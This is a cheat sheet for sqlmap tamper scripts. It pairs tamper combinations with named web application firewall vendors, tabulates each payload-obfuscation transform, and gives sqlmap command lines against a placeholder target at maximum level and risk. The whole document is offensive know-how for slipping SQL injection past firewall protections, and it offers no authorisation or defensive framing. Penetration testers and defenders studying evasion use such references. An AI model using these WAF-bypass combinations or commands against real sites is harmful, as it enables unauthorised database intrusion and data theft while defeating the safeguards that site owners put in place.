# SQLMap Tamper Scripts Reference

## Pre-Built Combinations by WAF Vendor

```bash
# ModSecurity (OWASP CRS)
--tamper=modsecurityversioned,modsecurityzeroversioned,space2comment,randomcase

# Cloudflare (2025)
--tamper=space2comment,randomcase,charencode,between

# AWS WAF
--tamper=between,charencode,chardoubleencode

# Imperva
--tamper=randomcase,space2comment,equaltolike

# MySQL WAFs (general)
--tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,versionedkeywords,versionedmorekeywords

# MSSQL WAFs (general)
--tamper=between,charencode,charunicodeencode,equaltolike,space2comment,space2dash,space2mssqlblank

# Unknown WAF (throw everything)
--tamper=apostrophemask,base64encode,between,chardoubleencode,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,space2comment,space2plus,unionalltounion,unmagicquotes
```

## Complete Tamper Reference

| Script | What It Does | Best For |
|---|---|---|
| `apostrophemask` | `'` → UTF-8 full-width `＇` | All |
| `apostrophenullencode` | `'` → `%00%27` | All |
| `base64encode` | Base64-encode entire payload | All |
| `between` | `>` → `NOT BETWEEN 0 AND` | MSSQL/MySQL/Oracle/PG |
| `bluecoat` | space → `%09` (tab) | MySQL, BlueCoat SGOS |
| `chardoubleencode` | double URL-encode all chars | All |
| `charencode` | URL-encode all chars | All |
| `charunicodeencode` | `%uXXXX` encoding | MSSQL/MySQL/ASP.NET |
| `commalesslimit` | `LIMIT 2,3` → `LIMIT 3 OFFSET 2` | MySQL |
| `equaltolike` | `=` → `LIKE` | MSSQL/MySQL |
| `greatest` | `>` → `GREATEST()` | MySQL/Oracle/PG |
| `halfversionedmorekeywords` | space → `/*!0` | MySQL |
| `lowercase` | all keywords lowercase | All |
| `modsecurityversioned` | `AND` → `/*!12345AND*/` | MySQL + ModSecurity |
| `modsecurityzeroversioned` | `AND` → `/*!0AND*/` | MySQL + ModSecurity |
| `multiplespaces` | single space → multiple spaces | All |
| `nonrecursivereplacement` | `union` → `uniunionon` | All |
| `overlongutf8` | overlong UTF-8 encoding | All |
| `percentage` | `select` → `s%e%l%e%c%t` | MSSQL |
| `randomcase` | `INSERT` → `INseRt` | All |
| `randomcomments` | insert `/**/` randomly | MySQL |
| `securesphere` | append `and '0having'='0having'` | All |
| `space2comment` | space → `/**/` | All |
| `space2dash` | space → `--\n` | MSSQL/SQLite |
| `space2hash` | space → `%23\n` | MySQL |
| `space2mssqlblank` | space → random MSSQL blanks | MSSQL |
| `space2mysqlblank` | space → random MySQL blanks | MySQL |
| `space2plus` | space → `+` | All |
| `space2randomblank` | space → random `%09/%0A/%0C/%0D` | All |
| `symboliclogical` | `AND` → `%26%26`, `OR` → `\|\|` | All |
| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` | All |
| `unmagicquotes` | `'` → `%bf%27` (GBK multi-byte) | MySQL (magic_quotes) |
| `uppercase` | all keywords uppercase | All |
| `versionedkeywords` | `union` → `/*!union*/` | MySQL |
| `xforwardedfor` | add random `X-Forwarded-For` header | All |

## Usage Examples

```bash
# Single tamper
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment

# Multiple tampers (applied in order left to right)
sqlmap -u "https://target.com/page?id=1" \
  --tamper=between,bluecoat,charencode,randomcase,space2comment \
  --random-agent --delay=2 --level=5 --risk=3
```